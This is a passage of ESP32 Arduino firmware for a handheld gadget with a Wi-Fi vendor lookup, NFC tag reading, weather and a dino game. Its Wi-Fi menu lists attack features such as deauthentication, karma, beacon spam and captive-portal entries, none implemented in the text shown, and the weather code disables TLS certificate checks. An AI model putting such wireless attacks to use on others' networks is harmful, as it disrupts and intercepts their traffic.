      (mac[0] == 0xDC && mac[1] == 0x4F) ||
      (mac[0] == 0xE0 && mac[1] == 0x98) ||
      (mac[0] == 0xE8 && mac[1] == 0x68) ||
      (mac[0] == 0xEC && mac[1] == 0x94) ||
      (mac[0] == 0xF0 && mac[1] == 0x08) ||
      (mac[0] == 0xF4 && mac[1] == 0xCF) ||
      (mac[0] == 0xF8 && mac[1] == 0xB3) ||
      (mac[0] == 0xFC && mac[1] == 0xF5)) return "Espressif";

  if ((mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x2F) ||
      (mac[0] == 0x00 && mac[1] == 0x23 && mac[2] == 0xCD) ||
      (mac[0] == 0x00 && mac[1] == 0x25 && mac[2] == 0x86) ||
      (mac[0] == 0x00 && mac[1] == 0x27 && mac[2] == 0x19) ||
      (mac[0] == 0x14 && mac[1] == 0xCC) ||
      (mac[0] == 0x18 && mac[1] == 0xA6) ||
      (mac[0] == 0x1C && mac[1] == 0x61) ||
      (mac[0] == 0x20 && mac[1] == 0xDC) ||
      (mac[0] == 0x28 && mac[1] == 0x2C) ||
      (mac[0] == 0x30 && mac[1] == 0xB5) ||
      (mac[0] == 0x34 && mac[1] == 0x60) ||
      (mac[0] == 0x38 && mac[1] == 0x94) ||
      (mac[0] == 0x3C && mac[1] == 0x46) ||
      (mac[0] == 0x40 && mac[1] == 0x16) ||
      (mac[0] == 0x44 && mac[1] == 0x94) ||
      (mac[0] == 0x48 && mac[1] == 0x0E) ||
      (mac[0] == 0x4C && mac[1] == 0xE1) ||
      (mac[0] == 0x54 && mac[1] == 0xAF) ||
      (mac[0] == 0x58 && mac[1] == 0xD5) ||
      (mac[0] == 0x5C && mac[1] == 0x63) ||
      (mac[0] == 0x60 && mac[1] == 0x32) ||
      (mac[0] == 0x64 && mac[1] == 0x56) ||
      (mac[0] == 0x64 && mac[1] == 0x66) ||
      (mac[0] == 0x64 && mac[1] == 0x70) ||
      (mac[0] == 0x68 && mac[1] == 0xFF) ||
      (mac[0] == 0x6C && mac[1] == 0x5A) ||
      (mac[0] == 0x70 && mac[1] == 0x4F) ||
      (mac[0] == 0x74 && mac[1] == 0xEA) ||
      (mac[0] == 0x78 && mac[1] == 0x8A) ||
      (mac[0] == 0x7C && mac[1] == 0x8B) ||
      (mac[0] == 0x80 && mac[1] == 0xEA) ||
      (mac[0] == 0x84 && mac[1] == 0x16) ||
      (mac[0] == 0x88 && mac[1] == 0x25) ||
      (mac[0] == 0x8C && mac[1] == 0x21) ||
      (mac[0] == 0x90 && mac[1] == 0x9F) ||
      (mac[0] == 0x94 && mac[1] == 0x0C) ||
      (mac[0] == 0x98 && mac[1] == 0xDA) ||
      (mac[0] == 0x9C && mac[1] == 0x3D) ||
      (mac[0] == 0xA0 && mac[1] == 0xF3) ||
      (mac[0] == 0xA4 && mac[1] == 0x2B) ||
      (mac[0] == 0xA8 && mac[1] == 0x57) ||
      (mac[0] == 0xAC && mac[1] == 0x15) ||
      (mac[0] == 0xB0 && mac[1] == 0x48) ||
      (mac[0] == 0xB0 && mac[1] == 0x95) ||
      (mac[0] == 0xB4 && mac[1] == 0xB0) ||
      (mac[0] == 0xB8 && mac[1] == 0xF8) ||
      (mac[0] == 0xBC && mac[1] == 0x46) ||
      (mac[0] == 0xC0 && mac[1] == 0x06) ||
      (mac[0] == 0xC0 && mac[1] == 0x4A) ||
      (mac[0] == 0xC4 && mac[1] == 0x6E) ||
      (mac[0] == 0xC8 && mac[1] == 0x3A) ||
      (mac[0] == 0xCC && mac[1] == 0x32) ||
      (mac[0] == 0xD0 && mac[1] == 0x76) ||
      (mac[0] == 0xD4 && mac[1] == 0x6E) ||
      (mac[0] == 0xD8 && mac[1] == 0x0D) ||
      (mac[0] == 0xDC && mac[1] == 0x9F) ||
      (mac[0] == 0xE0 && mac[1] == 0x05) ||
      (mac[0] == 0xE4 && mac[1] == 0xC1) ||
      (mac[0] == 0xE8 && mac[1] == 0x94) ||
      (mac[0] == 0xEC && mac[1] == 0x08) ||
      (mac[0] == 0xEC && mac[1] == 0x17) ||
      (mac[0] == 0xF0 && mac[1] == 0x9F) ||
      (mac[0] == 0xF4 && mac[1] == 0x28) ||
      (mac[0] == 0xF4 && mac[1] == 0xEC) ||
      (mac[0] == 0xF8 && mac[1] == 0xD1) ||
      (mac[0] == 0xFC && mac[1] == 0x7C)) return "TP-Link";

  if ((mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x58) ||
      (mac[0] == 0x00 && mac[1] == 0x22 && mac[2] == 0xB0) ||
      (mac[0] == 0x00 && mac[1] == 0x24 && mac[2] == 0x01) ||
      (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x5A) ||
      (mac[0] == 0x14 && mac[1] == 0xD6) ||
      (mac[0] == 0x1C && mac[1] == 0x7E) ||
      (mac[0] == 0x1C && mac[1] == 0xBD) ||
      (mac[0] == 0x28 && mac[1] == 0x10) ||
      (mac[0] == 0x34 && mac[1] == 0x08) ||
      (mac[0] == 0x3C && mac[1] == 0x1E) ||
      (mac[0] == 0x40 && mac[1] == 0x9B) ||
      (mac[0] == 0x54 && mac[1] == 0xB8) ||
      (mac[0] == 0x5C && mac[1] == 0xD9) ||
      (mac[0] == 0x74 && mac[1] == 0xDA) ||
      (mac[0] == 0x78 && mac[1] == 0x54) ||
      (mac[0] == 0x84 && mac[1] == 0xC9) ||
      (mac[0] == 0x90 && mac[1] == 0x94) ||
      (mac[0] == 0x9C && mac[1] == 0xD6) ||
      (mac[0] == 0xA0 && mac[1] == 0xAB) ||
      (mac[0] == 0xB8 && mac[1] == 0xA3) ||
      (mac[0] == 0xC8 && mac[1] == 0xBE) ||
      (mac[0] == 0xCC && mac[1] == 0xB2) ||
      (mac[0] == 0xF0 && mac[1] == 0x7D) ||
      (mac[0] == 0xFC && mac[1] == 0x75)) return "D-Link";

  if ((mac[0] == 0x00 && mac[1] == 0x0F && mac[2] == 0xB5) ||
      (mac[0] == 0x00 && mac[1] == 0x14 && mac[2] == 0x6C) ||
      (mac[0] == 0x00 && mac[1] == 0x18 && mac[2] == 0x4D) ||
      (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x2A) ||
      (mac[0] == 0x00 && mac[1] == 0x1F && mac[2] == 0x33) ||
      (mac[0] == 0x00 && mac[1] == 0x22 && mac[2] == 0x3F) ||
      (mac[0] == 0x00 && mac[1] == 0x24 && mac[2] == 0xB2) ||
      (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0xF2) ||
      (mac[0] == 0x20 && mac[1] == 0x4E) ||
      (mac[0] == 0x28 && mac[1] == 0xC6) ||
      (mac[0] == 0x2C && mac[1] == 0x30) ||
      (mac[0] == 0x30 && mac[1] == 0x46) ||
      (mac[0] == 0x3C && mac[1] == 0x37) ||
      (mac[0] == 0x40 && mac[1] == 0x5D) ||
      (mac[0] == 0x4C && mac[1] == 0x60) ||
      (mac[0] == 0x50 && mac[1] == 0x6A) ||
      (mac[0] == 0x54 && mac[1] == 0xA5) ||
      (mac[0] == 0x60 && mac[1] == 0x38) ||
      (mac[0] == 0x64 && mac[1] == 0x55) ||
      (mac[0] == 0x6C && mac[1] == 0xB0) ||
      (mac[0] == 0x74 && mac[1] == 0x44) ||
      (mac[0] == 0x78 && mac[1] == 0x45) ||
      (mac[0] == 0x7C && mac[1] == 0xB7) ||
      (mac[0] == 0x80 && mac[1] == 0x37) ||
      (mac[0] == 0x84 && mac[1] == 0x1B) ||
      (mac[0] == 0x8C && mac[1] == 0x3A) ||
      (mac[0] == 0xA0 && mac[1] == 0x04) ||
      (mac[0] == 0xA4 && mac[1] == 0x2B) ||
      (mac[0] == 0xA8 && mac[1] == 0x40) ||
      (mac[0] == 0xAC && mac[1] == 0x6E) ||
      (mac[0] == 0xB0 && mac[1] == 0x39) ||
      (mac[0] == 0xB0 && mac[1] == 0x7F) ||
      (mac[0] == 0xB4 && mac[1] == 0x87) ||
      (mac[0] == 0xB8 && mac[1] == 0x38) ||
      (mac[0] == 0xBC && mac[1] == 0x6F) ||
      (mac[0] == 0xC0 && mac[1] == 0x3F) ||
      (mac[0] == 0xC4 && mac[1] == 0x3D) ||
      (mac[0] == 0xC8 && mac[1] == 0xD7) ||
      (mac[0] == 0xCC && mac[1] == 0x40) ||
      (mac[0] == 0xD0 && mac[1] == 0x5F) ||
      (mac[0] == 0xD4 && mac[1] == 0x3D) ||
      (mac[0] == 0xD8 && mac[1] == 0xDA) ||
      (mac[0] == 0xDC && mac[1] == 0xEF) ||
      (mac[0] == 0xE0 && mac[1] == 0x46) ||
      (mac[0] == 0xE4 && mac[1] == 0xF4) ||
      (mac[0] == 0xE8 && mac[1] == 0xFC) ||
      (mac[0] == 0xEC && mac[1] == 0x36) ||
      (mac[0] == 0xF4 && mac[1] == 0x4B) ||
      (mac[0] == 0xF8 && mac[1] == 0x73) ||
      (mac[0] == 0xFC && mac[1] == 0xAA)) return "Netgear";

  return "Unknown";
}

// ================= ГЛАВНОЕ МЕНЮ =================
const char* mainApps[] = { "WiFi", "NFC", "Display", "Dino", "Weather", "Settings", "Info" };
const int MAIN_APPS = 7;

unsigned long mainSlideStart = 0;
int  mainSlideDir = 0;
const int SLIDE_DURATION = 140;

void drawDots() {
  int dotW = 5, gap = 3;
  int startX = (160 - (MAIN_APPS * (dotW + gap) - gap)) / 2;
  for (int i = 0; i < MAIN_APPS; i++) {
    int x = startX + i * (dotW + gap);
    if (i == mainItem) tft.fillCircle(x + dotW / 2, 126, 3, COL_ACCENT);
    else               tft.drawCircle(x + dotW / 2, 126, 2, COL_ACCENT2);
  }
}

void drawCardContent(int x, int y, int w, int h, int idx) {
  const char* sub = "";
  uint16_t col = COL_ACCENT2;
  switch (idx) {
    case 0: sub = "Wi-Fi tools";  col = COL_ACCENT;  break;
    case 1: sub = "NFC / RFID";   col = COL_ACCENT2; break;
    case 2: sub = "Test screen";  col = COL_ACCENT;  break;
    case 3: sub = "Jump & run";   col = COL_ACCENT2; break;
    case 4: sub = "Time & temp";  col = COL_ACCENT;  break;
    case 5: sub = "Brightness";   col = COL_ACCENT2; break;
    case 6: sub = "About NEXUS5"; col = COL_ACCENT;  break;
  }
  int tw = strlen(sub) * 6 * 2;
  int tx = x + (w - tw) / 2;
  if (tx < x + 4) tx = x + 4;
  text(sub, tx, y + h / 2 - 8, col, 2);
}

void drawAppCard(int idx, int offsetX) {
  int x = offsetX, y = 22, w = 156, h = 96;
  tft.drawRect(x, y, w, h, COL_ACCENT);
  tft.drawRect(x + 1, y + 1, w - 2, h - 2, COL_ACCENT);
  tft.fillRect(x + 2, y + 2, w - 4, 14, COL_ACCENT);

  char num[8]; snprintf(num, sizeof(num), "0%d", idx + 1);
  text(num, x + 4, y + 4, COL_BG);

  const char* title = mainApps[idx];
  int tw = strlen(title) * 6 * 2;
  int tx = x + (w - tw) / 2;
  if (tx < x + 20) tx = x + 20;
  text(title, tx, y + 4, COL_BG);

  tft.drawFastHLine(x + 2, y + 16, w - 4, COL_BG);
  drawCardContent(x, y, w, h, idx);

  tft.drawFastHLine(x + 2, y + h - 16, w - 4, COL_DIM);
  text("NEXT: next", x + 4, y + h - 12, COL_DIM);
  text("SELECT: run", x + 80, y + h - 12, COL_DIM);
}

void drawMainMenu() {
  clearScreen(); header("NEXUS5");
  drawAppCard(mainItem, 2);
  drawDots();
}

void tickMain(bool entered) {
  if (entered) drawMainMenu();

  if (mainSlideDir != 0) {
    unsigned long elapsed = millis() - mainSlideStart;
    if (elapsed >= SLIDE_DURATION) {
      mainSlideDir = 0;
      drawMainMenu();
    } else {
      float t = (float)elapsed / SLIDE_DURATION;
      int offset = (int)((1.0 - t) * 158 * mainSlideDir);
      clearScreen(); header("NEXUS5");
      drawAppCard(mainItem, 2 - offset);
      drawDots();
    }
    return;
  }

  if (nextPressed()) {
    mainItem = (mainItem + 1) % MAIN_APPS;
    mainSlideDir = -1;
    mainSlideStart = millis();
  }

  if (selectPressed()) {
    switch (mainItem) {
      case 0: wifiItem = 0; screen = WIFI_MENU; break;
      case 1: nfcItem = 0; screen = NFC_MENU; break;
      case 2: screen = DISPLAY_TEST; break;
      case 3: dinoGame(); screen = MAIN; break;
      case 4: screen = WEATHER; break;
      case 5: settingsItem = 0; screen = SETTINGS; break;
      case 6: screen = INFO; break;
    }
  }
}

// ================= NFC =================
const char* nfcItems[] = { "Read Tag", "History", "Back" };
const int NFC_ITEMS = 3;

void drawNfcMenu() {
  clearScreen(); header("NFC / RFID");
  for (int i = 0; i < NFC_ITEMS; i++) menuItem(28 + i * 22, nfcItems[i], nfcItem == i);
  if (nfcReady) centerText("PN532 ready", 118, COL_OK);
  else          centerText("PN532 not found", 118, COL_WARN);
}

void tickNfcMenu(bool entered) {
  if (entered) drawNfcMenu();
  if (backPressed()) { screen = MAIN; return; }
  if (nextPressed()) { nfcItem = (nfcItem + 1) % NFC_ITEMS; drawNfcMenu(); }
  if (selectPressed()) {
    if (nfcItem == 0) screen = NFC_READ;
    else if (nfcItem == 1) screen = NFC_HISTORY;
    else screen = MAIN;
  }
}

void drawNfcReadScreen(const char* line1, const char* line2, const char* line3) {
  clearScreen(); header("NFC Read");
  if (line1) centerText(line1, 30, COL_ACCENT, 2);
  if (line2) centerText(line2, 60, COL_TEXT);
  if (line3) centerText(line3, 80, COL_ACCENT2);
  centerText("BACK: exit", 118, COL_DIM);
}

void addNfcHistory(const char* uid, const char* type) {
  if (nfcHistoryCount >= NFC_HISTORY_MAX) {
    for (int i = 0; i < NFC_HISTORY_MAX - 1; i++) nfcHistory[i] = nfcHistory[i + 1];
    nfcHistoryCount = NFC_HISTORY_MAX - 1;
  }
  strncpy(nfcHistory[nfcHistoryCount].uid, uid, 31);
  nfcHistory[nfcHistoryCount].uid[31] = '\0';
  strncpy(nfcHistory[nfcHistoryCount].type, type, 23);
  nfcHistory[nfcHistoryCount].type[23] = '\0';
  nfcHistory[nfcHistoryCount].time = millis();
  nfcHistoryCount++;
}

void tickNfcRead(bool entered) {
  static unsigned long lastDraw = 0;
  static bool nfcInited = false;

  if (entered) {
    if (!nfcInited) {
      Wire.begin(21, 22);
      nfc.begin();
      uint32_t ver = nfc.getFirmwareVersion();
      nfcReady = (ver != 0);
      if (nfcReady) nfc.SAMConfig();
      nfcInited = true;
    }

    if (!nfcReady) drawNfcReadScreen("PN532", "not found", "check wires");
    else           drawNfcReadScreen("Ready", "Place tag", nullptr);
    lastDraw = millis();
  }

  if (backPressed()) { screen = NFC_MENU; return; }

  if (!nfcReady) {
    if (millis() - lastDraw > 500) {
      lastDraw = millis();
      Wire.begin(21, 22);
      nfc.begin();
      uint32_t ver = nfc.getFirmwareVersion();
      nfcReady = (ver != 0);
      if (nfcReady) nfc.SAMConfig();
      if (nfcReady) drawNfcReadScreen("Ready", "Place tag", nullptr);
      else          drawNfcReadScreen("PN532", "not found", "check wires");
    }
    return;
  }

  uint8_t uid[7] = {0};
  uint8_t uidLen = 0;
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100)) {
    char uidStr[32] = "";
    for (int i = 0; i < uidLen; i++) {
      char b[4];
      snprintf(b, sizeof(b), "%02X", uid[i]);
      strcat(uidStr, b);
      if (i < uidLen - 1) strcat(uidStr, ":");
    }

    const char* type = "MIFARE/NTAG";
    addNfcHistory(uidStr, type);
    beepSuccess();

    clearScreen(); header("Tag found");
    centerText("UID", 24, COL_ACCENT, 2);
    char shortUid[22];
    truncateTo(uidStr, shortUid, 21);
    centerText(shortUid, 48, COL_TEXT);
    char lenbuf[24]; snprintf(lenbuf, sizeof(lenbuf), "Length: %d bytes", uidLen);
    centerText(lenbuf, 68, COL_ACCENT2);
    centerText("SELECT: rescan", 100, COL_DIM);
    centerText("BACK: menu", 114, COL_DIM);

    while (true) {
      if (backPressed()) { screen = NFC_MENU; return; }
      if (selectPressed()) break;
      delay(20);
    }
    lastDraw = 0;
  } else {
    if (millis() - lastDraw > 600) {
      lastDraw = millis();
      drawNfcReadScreen("Ready", "Place tag", nullptr);
    }
  }
}

void drawNfcHistoryScreen() {
  clearScreen(); header("NFC History");
  if (nfcHistoryCount == 0) {
    centerText("Empty", 60, COL_ACCENT2);
    centerText("BACK: exit", 110, COL_DIM);
    return;
  }
  int show = min(nfcHistoryCount, 5);
  for (int i = 0; i < show; i++) {
    int y = 24 + i * 18;
    char shortUid[20];
    truncateTo(nfcHistory[i].uid, shortUid, 18);
    text(shortUid, 4, y, COL_TEXT);
    char tbuf[16]; snprintf(tbuf, sizeof(tbuf), "%lus", nfcHistory[i].time / 1000);
    text(tbuf, 132, y, COL_DIM);
  }
  centerText("BACK: exit", 120, COL_DIM);
}

void tickNfcHistory(bool entered) {
  if (entered) drawNfcHistoryScreen();
  if (backPressed()) { screen = NFC_MENU; return; }
}

// ================= WiFi =================
const char* wifiItems[] = {
  "Scan Networks", "My WiFi", "Hotspot",
  "Beacon Spam", "Captive Portal", "Probe Sniffer",
  "Deauth Attack", "WiFi Radar", "Deauth Detector", "Karma Attack"
};
const int WIFI_ITEMS = 10;
const int WIFI_VISIBLE = 5;
const int WIFI_ITEM_H = 18;

void drawWiFiMenu() {
  clearScreen(); header("WiFi");
  int start = wifiItem - WIFI_VISIBLE / 2;
  if (start < 0) start = 0;
  if (start > WIFI_ITEMS - WIFI_VISIBLE) start = WIFI_ITEMS - WIFI_VISIBLE;
  for (int row = 0; row < WIFI_VISIBLE; row++) {
    int i = start + row;
    if (i >= WIFI_ITEMS) break;
    menuItem(22 + row * WIFI_ITEM_H, wifiItems[i], i == wifiItem);
  }
  if (WIFI_ITEMS > WIFI_VISIBLE) {
    int trackY = 20, trackH = 118;
    tft.drawFastVLine(157, trackY, trackH, COL_DIM);
    int thumbH = trackH * WIFI_VISIBLE / WIFI_ITEMS;
    int thumbY = trackY + (trackH - thumbH) * wifiItem / (WIFI_ITEMS - 1);
    tft.fillRect(156, thumbY, 3, thumbH, COL_ACCENT);
  }
}

const int NET_ROW_H = 20;
const int NET_VISIBLE = 5;

void drawNetworkList() {
  clearScreen(); header("Networks");
  if (networkCount == 0) { centerText("No networks", 60, COL_WARN); return; }
  int start = networkItem - NET_VISIBLE / 2;
  if (start < 0) start = 0;
  if (start > networkCount - NET_VISIBLE) start = networkCount - NET_VISIBLE;
  for (int row = 0; row < NET_VISIBLE; row++) {
    int i = start + row;
    if (i >= networkCount) break;
    int y = 22 + row * NET_ROW_H;
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<hidden>";
    bool sel = (i == networkItem);
    if (sel) tft.fillRoundRect(2, y - 1, 154, 18, 3, COL_ACCENT);
    char shortSsid[20]; truncateTo(ssid.c_str(), shortSsid, 18);
    text(shortSsid, 6, y + 3, sel ? COL_BG : COL_ACCENT2);
    char r[8]; snprintf(r, sizeof(r), "%d", WiFi.RSSI(i));
    text(r, 122, y + 3, sel ? COL_BG : COL_ACCENT);
    bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
    text(open ? "O" : "L", 144, y + 3, open ? COL_OK : COL_WARN);
  }
  if (networkCount > NET_VISIBLE) {
    int trackY = 20, trackH = 120;
    tft.drawFastVLine(157, trackY, trackH, COL_DIM);
    int thumbH = trackH * NET_VISIBLE / networkCount;
    if (thumbH < 4) thumbH = 4;
    int thumbY = trackY + (trackH - thumbH) * networkItem / (networkCount - 1);
    tft.fillRect(156, thumbY, 3, thumbH, COL_ACCENT);
  }
}

void message(const char* title, const char* a, const char* b, uint16_t c) {
  clearScreen();
  centerText(title, 25, COL_ACCENT, 2);
  if (a) centerText(a, 55, c);
  if (b) centerText(b, 70, c);
}

bool scanNetworks() {
  WiFi.scanDelete();
  WiFi.scanNetworks(true, true);
  int frame = 0;
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
    drawLoading("WiFi", frame++);
    delay(200);
  }
  networkCount = WiFi.scanComplete();
  if (networkCount <= 0) {
    networkCount = 0;
    message("WiFi", "No networks", nullptr, COL_WARN);
    delay(800);
    return false;
  }
  networkItem = 0;
  return true;
}

void showNetworkInfo(int i) {
  clearScreen(); header("Network");
  String ssid = WiFi.SSID(i);
  if (ssid.length() == 0) ssid = "<hidden>";
  char shortSsid[22]; truncateTo(ssid.c_str(), shortSsid, 21);
  text(shortSsid, 6, 24, COL_TEXT);
  uint8_t* bssid = WiFi.BSSID(i);
  if (bssid) {
    const char* vendor = ouiVendor(bssid);
    char vb[24]; snprintf(vb, sizeof(vb), "Vendor: %s", vendor);
    text(vb, 6, 40, COL_ACCENT2);
  }
  char b[32]; snprintf(b, sizeof(b), "RSSI: %d dBm", WiFi.RSSI(i));
  text(b, 6, 56, COL_ACCENT);
  char ch[24]; snprintf(ch, sizeof(ch), "Channel: %d", WiFi.channel(i));
  text(ch, 6, 72, COL_ACCENT2);
  bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
  text(open ? "OPEN" : "LOCKED", 6, 88, open ? COL_OK : COL_WARN);
  text(open ? "SELECT: connect" : "Password required",
       6, 106, open ? COL_TEXT : COL_ACCENT);
}

void connectOpenNetwork(int i) {
  if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
    message("WiFi", "Password required", nullptr, COL_ACCENT);
    beepError(); delay(900); return;
  }
  String ssid = WiFi.SSID(i);
  WiFi.disconnect(true); delay(150);
  WiFi.begin(ssid.c_str());
  unsigned long start = millis();
  int frame = 0;
  while (WiFi.status() != WL_CONNECTED && millis() - start < 9000) {
    if (backPressed()) { WiFi.disconnect(); return; }
    drawLoading("Connecting", frame++); delay(200);
  }
  if (WiFi.status() == WL_CONNECTED) {
    message("Connected", WiFi.localIP().toString().c_str(), nullptr, COL_OK);
    beepSuccess();
  } else {
    message("Failed", "Connection failed", nullptr, COL_WARN);
    beepError();
  }
  delay(900);
}

void showWiFiStatus() {
  clearScreen(); header("My WiFi");
  if (WiFi.status() != WL_CONNECTED) { centerText("Not connected", 48, COL_WARN); return; }
  char ssid[22]; truncateTo(WiFi.SSID().c_str(), ssid, 21);
  text(ssid, 6, 27, COL_ACCENT);
  text(WiFi.localIP().toString().c_str(), 6, 47, COL_TEXT);
  char b[30]; snprintf(b, sizeof(b), "RSSI %d dBm", WiFi.RSSI());
  text(b, 6, 67, COL_ACCENT2);
}

void startHotspot() { WiFi.mode(WIFI_AP_STA); WiFi.softAP(HOTSPOT_SSID); apActive = true; beepSuccess(); }
void stopHotspot()  { WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA); apActive = false; beepBack(); }

void drawHotspotScreen() {
  clearScreen(); header("Hotspot");
  if (apActive) {
    centerText("Hotspot ON", 26, COL_ACCENT, 2);
    text("IP", 10, 52, COL_ACCENT2);
    text(WiFi.softAPIP().toString().c_str(), 34, 52, COL_TEXT);
    char c[20]; snprintf(c, sizeof(c), "Clients: %d", WiFi.softAPgetStationNum());
    text(c, 10, 68, COL_ACCENT);
    centerText("SELECT: stop", 114, COL_DIM);
  } else {
    centerText("Hotspot OFF", 50, COL_WARN, 2);
    centerText("SELECT: start", 90, COL_DIM);
  }
}
void tickHotspot(bool entered) {
  if (entered) drawHotspotScreen();
  if (backPressed()) { screen = WIFI_MENU; return; }
  if (selectPressed()) { if (apActive) stopHotspot(); else startHotspot(); drawHotspotScreen(); }
}

void displayTestScreen() {
  clearScreen(); header("Display Test");
  tft.drawRect(8, 25, 44, 30, COL_ACCENT);
  tft.fillRect(58, 25, 44, 30, COL_ACCENT);
  tft.fillRect(108, 25, 44, 30, COL_ACCENT2);
  tft.drawRect(8, 62, 144, 35, COL_ACCENT);
  tft.fillCircle(30, 79, 10, COL_ACCENT);
  tft.drawCircle(80, 79, 10, COL_ACCENT2);
  tft.fillCircle(130, 79, 10, COL_ACCENT2);
}
void infoScreen() {
  clearScreen(); header("Info");
  text("NEXUS5", 8, 28, COL_ACCENT, 2);
  text("ESP32", 8, 54, COL_ACCENT2);
  text("ST7735 + PN532", 8, 70, COL_ACCENT);
  text("WiFi + Dino + NFC", 8, 86, COL_TEXT);
}

// ================= JSON =================
float jsonFloat(const String& src, const char* key) {
  int i = src.indexOf(key);
  if (i < 0) return 0;
  i += strlen(key);
  while (i < (int)src.length() && (src[i] == ' ' || src[i] == ':')) i++;
  int e = i;
  while (e < (int)src.length() && (isDigit(src[e]) || src[e] == '-' || src[e] == '.')) e++;
  return src.substring(i, e).toFloat();
}
String jsonStr(const String& src, const char* key) {
  int i = src.indexOf(key);
  if (i < 0) return "";
  i = src.indexOf('"', i + strlen(key));
  if (i < 0) return "";
  i++;
  int e = src.indexOf('"', i);
  if (e < 0) return "";
  return src.substring(i, e);
}

bool fetchGeoAndTime() {
  if (WiFi.status() != WL_CONNECTED) return false;
  HTTPClient http;
  http.begin("http://ip-api.com/json/?fields=lat,lon,city,offset");
  int code = http.GET();
  if (code != 200) { http.end(); return false; }
  String payload = http.getString();
  http.end();
  lastLat = jsonFloat(payload, "\"lat\":");
  lastLon = jsonFloat(payload, "\"lon\":");
  lastCity = jsonStr(payload, "\"city\":");
  long offset = (long)jsonFloat(payload, "\"offset\":");
  configTime(offset, 0, "pool.ntp.org", "time.nist.gov");
  return true;
}

bool fetchWeather() {
  if (WiFi.status() != WL_CONNECTED) return false;
  NetworkClientSecure client;
  client.setInsecure();
  HTTPClient https;
  String url = "https://api.open-meteo.com/v1/forecast?latitude=" + String(lastLat, 4) +
               "&longitude=" + String(lastLon, 4) + "&current_weather=true";
  https.begin(client, url);
  int code = https.GET();
  if (code != 200) { https.end(); return false; }
  String payload = https.getString();
  https.end();
  int cwIdx = payload.indexOf("\"current_weather\":");
  String cw = cwIdx >= 0 ? payload.substring(cwIdx) : payload;
  weatherData.tempC = jsonFloat(cw, "\"temperature\":");
  weatherData.code = (int)jsonFloat(cw, "\"weathercode\":");
  weatherData.valid = true;
  return true;
}

const char* weatherCodeText(int code) {
  if (code == 0) return "Clear";
  if (code <= 3) return "Partly cloudy";
  if (code == 45 || code == 48) return "Fog";
  if (code <= 57) return "Drizzle";
  if (code <= 67) return "Rain";
  if (code <= 77) return "Snow";
  if (code <= 82) return "Rain showers";
  if (code <= 86) return "Snow showers";
  if (code >= 95) return "Thunderstorm";
  return "Unknown";
}

void drawWeatherScreen(bool geoOk, bool weatherOk) {
  clearScreen(); header("Weather");
  if (!geoOk) {
    centerText("No connection", 50, COL_WARN);
    centerText("SELECT: retry", 100, COL_DIM);
    return;
  }
  struct tm timeinfo;
  char timeStr[16] = "--:--", dateStr[16] = "";
  if (getLocalTime(&timeinfo, 100)) {
    strftime(timeStr, sizeof(timeStr), "%H:%M", &timeinfo);
    strftime(dateStr, sizeof(dateStr), "%d.%m.%Y", &timeinfo);
  }
  centerText(timeStr, 24, COL_TEXT, 2);
  centerText(dateStr, 42, COL_ACCENT2);
  if (weatherOk) {
    char t[16]; snprintf(t, sizeof(t), "%.1f C", weatherData.tempC);
    centerText(t, 62, COL_ACCENT, 2);
    centerText(weatherCodeText(weatherData.code), 82, COL_TEXT);
    char city[22]; truncateTo(lastCity.c_str(), city, 21);
    centerText(city, 96, COL_ACCENT2);
  } else {
    centerText("Weather unavailable", 70, COL_WARN);
  }
  centerText("SELECT: refresh", 112, COL_DIM);
}

void loadWeatherAndDraw() {
  drawLoading("Weather", 0);
  bool geoOk = fetchGeoAndTime();
  drawLoading("Weather", 1);
  bool weatherOk = geoOk && fetchWeather();
  drawWeatherScreen(geoOk, weatherOk);
}

// ================= DINO =================
const int GROUND_Y = 100;
int dinoX = 18;
float dinoY = GROUND_Y, dinoVY = 0;
int  dinoScore = 0, bestScore = 0;
float dinoSpeed = 3.5;
bool dinoDead = false, dinoDucking = false;
unsigned long lastDinoFrame = 0;
int animFrame = 0;

struct Cactus { int x; int type; int h; bool active; };
const int CACTUS_MAX = 3;
Cactus cacti[CACTUS_MAX];

struct Cloud { float x; int y; float speed; };
const int CLOUD_MAX = 3;
Cloud clouds[CLOUD_MAX];

struct Bird { float x; int y; float speed; bool active; int flapFrame; };
const int BIRD_MAX = 2;
Bird birds[BIRD_MAX];
unsigned long lastBirdSpawn = 0;

void initClouds() {
  for (int i = 0; i < CLOUD_MAX; i++) {
    clouds[i].x = random(0, 200);
    clouds[i].y = 25 + random(0, 25);
    clouds[i].speed = 0.3 + random(0, 100) / 300.0;
  }
}

void drawCloudShape(int x, int y, uint16_t col) {
  tft.fillCircle(x, y, 5, col);
  tft.fillCircle(x + 7, y - 3, 7, col);
  tft.fillCircle(x + 16, y, 5, col);
  tft.fillRect(x, y, 16, 5, col);
}

void dinoBackground() {
  tft.fillRect(0, 18, 160, 82, COL_BG);

  for (int i = 0; i < 20; i++) {
    int sx = (i * 53 + 7) % 160;
    int sy = 22 + (i * 31 + 11) % 60;
    tft.drawPixel(sx, sy, COL_ACCENT2);
  }

  for (int i = 0; i < CLOUD_MAX; i++)
    drawCloudShape((int)clouds[i].x, clouds[i].y, COL_ACCENT2);

  // Земля — только пунктир НИЖЕ кактусов, без сплошной линии
  tft.fillRect(0, GROUND_Y + 17, 160, 15, COL_BG);
  for (int x = 0; x < 160; x += 12)
    tft.drawFastHLine(x, GROUND_Y + 22, 6, COL_ACCENT2);
}

void drawDinoBody(int x, int y, bool ducking, int frame) {
  tft.fillRect(x + 4, y + 8, 14, 14, COL_ACCENT);
  tft.fillRect(x + 12, y + 1, 11, 11, COL_ACCENT);
  tft.fillRect(x + 21, y + 6, 5, 4, COL_ACCENT);
  tft.fillRect(x, y + 13, 5, 4, COL_ACCENT);
  tft.fillRect(x + 19, y + 3, 2, 2, COL_BG);

  if (ducking) {
    tft.fillRect(x + 5, y + 22, 5, 4, COL_ACCENT);
    tft.fillRect(x + 13, y + 22, 5, 4, COL_ACCENT);
  } else {
    if (frame < 4) {
